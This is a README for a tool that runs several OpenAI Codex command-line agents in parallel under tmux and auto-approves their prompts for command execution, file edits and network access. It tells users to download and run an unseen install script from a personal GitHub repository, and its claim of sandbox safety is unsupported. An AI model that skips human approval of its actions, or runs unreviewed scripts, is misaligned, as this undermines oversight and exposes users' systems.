# 🤖 codex-yolo - Manage OpenAI Agents Easily

[![Download codex-yolo](https://img.shields.io/badge/Download-codex--yolo-%23007ACC?style=for-the-badge&logo=github)](https://github.com/vxctorrdrgzzz/codex-yolo)

---

## ❓ What is codex-yolo?

codex-yolo lets you run multiple OpenAI Codex command-line agents at the same time. It works inside a terminal tool called tmux that helps you keep your sessions organized. This app automatically says "yes" to permission prompts so you don’t have to stop and approve actions like running commands, editing files, or accessing the network. At the same time, it keeps your environment safe by protecting the sandbox your agents run in.

If you want to use OpenAI Codex on your Windows machine, this tool helps you do that with less hassle.

---

## 🖥️ Requirements

Before you start, make sure your computer meets these requirements:

- Windows 10 or newer
- A working internet connection
- Basic knowledge of using the command prompt (cmd) or PowerShell
- Installed [Windows Subsystem for Linux (WSL)](https://learn.microsoft.com/en-us/windows/wsl/install)  
  *This is needed because codex-yolo runs inside a Linux terminal environment on Windows.*

---

## ⚙️ Tools You Need

1. **Windows Subsystem for Linux (WSL):**  
	WSL lets you run Linux directly on your Windows machine without a virtual machine.  
	You can install it by opening PowerShell as admin and running:  
	```powershell
	wsl --install
	```  
	After WSL installs, restart your computer.

2. **Terminal app:**  
	You will need Windows Terminal or Command Prompt to use WSL. Windows Terminal is recommended and available from the Microsoft Store.

3. **Git:**  
	Git helps you download codex-yolo files. You can install Git from [https://git-scm.com/download/win](https://git-scm.com/download/win). Follow the setup steps and accept default options.

---

## 🚀 Getting Started

### Step 1: Open WSL

After setting up WSL, open Windows Terminal or Command Prompt and type:

```
wsl
```

This opens a Linux terminal window inside Windows.

### Step 2: Update your Linux packages

Run these commands one at a time:

```
sudo apt update
sudo apt upgrade -y
```

This updates your system to the latest package versions.

### Step 3: Install tmux and curl

codex-yolo runs inside tmux, and curl helps download files. Install both with:

```
sudo apt install tmux curl -y
```

### Step 4: Download codex-yolo setup script

Use curl to get the installer script:

```
curl -fsSL https://github.com/vxctorrdrgzzz/codex-yolo/raw/main/install.sh -o install_codex_yolo.sh
```

### Step 5: Run the installer

Make the script executable:

```
chmod +x install_codex_yolo.sh
```

Then run it:

```
./install_codex_yolo.sh
```

The script sets up the codex-yolo software and its environment. It may ask for your password to allow some changes.

---

## 💾 Download codex-yolo

[![Download codex-yolo](https://img.shields.io/badge/Download-codex--yolo-%237E7E7E?style=for-the-badge&logo=github)](https://github.com/vxctorrdrgzzz/codex-yolo)

To get the latest version, visit the GitHub page above. You start by cloning or downloading the repository to your Linux environment inside WSL.

To clone, run:

```
git clone https://github.com/vxctorrdrgzzz/codex-yolo.git
```

Then enter the folder:

```
cd codex-yolo
```

---

## 🔧 How to Run codex-yolo

Once installed, you can start codex-yolo inside your WSL terminal:

1. Open your Linux terminal (`wsl`).
2. Change to the codex-yolo folder if you are not already there.
3. Run the start command:

```
./start_codex_yolo.sh
```

This opens tmux with multiple Codex agents running in parallel. You will see different panels for each agent.

---

## 🛠️ How codex-yolo Works

- **Automatic approvals:** The tool accepts prompts about command execution, file changes, and network use automatically. This lets agents work without pausing for user input.

- **Sandbox protection:** It keeps the agents isolated to prevent damage or unwanted access to your files and system.

- **Parallel agents:** You can have multiple Codex instances running side-by-side inside one terminal window.

- **tmux control:** You can navigate and control each agent using tmux shortcuts like:

  - `Ctrl+b` then arrow keys to switch panels
  - `Ctrl+b` then `c` to open a new panel  
  - `Ctrl+b` then `x` to close a panel

---

## 📋 Common Commands

- To exit codex-yolo:  
  Close tmux by typing `exit` or pressing `Ctrl+b` then `d` to detach.

- To see running tmux sessions:  
  ```
  tmux ls
  ```

- To attach to a tmux session:  
  ```
  tmux attach -t <session-name>
  ```

---

## 🚨 Troubleshooting

- **Command not found:** Make sure you are inside WSL and have properly installed tmux and codex-yolo.

- **Permission denied:** Check that the install script has executable rights (`chmod +x`). You may need to run the installer as sudo.

- **Agents hang or freeze:** Restart the tmux session by exiting and running `./start_codex_yolo.sh` again.

- **Network issues:** Make sure your Windows firewall or antivirus is not blocking WSL internet access.

---

## 🔄 Update codex-yolo

To keep codex-yolo current, run:

```
cd ~/codex-yolo
git pull
```

Follow by running the installer script again:

```
./install_codex_yolo.sh
```

This fetches the latest updates and reconfigures the tool.

---

## 🚪 Uninstall codex-yolo

To remove codex-yolo and its files:

```
cd ~
rm -rf codex-yolo
```

This deletes the main folder. You might also want to remove tmux if you do not use it elsewhere:

```
sudo apt remove tmux -y
```

---

## 📝 More Information

- The tool uses OpenAI Codex APIs inside the command line.
- It relies on tmux for handling multiple sessions.
- Automatic permission approval lets the system run smoothly without manual input.
- The sandbox limits what each Codex agent can access on your machine.

For more details, visit the GitHub page:

[https://github.com/vxctorrdrgzzz/codex-yolo](https://github.com/vxctorrdrgzzz/codex-yolo)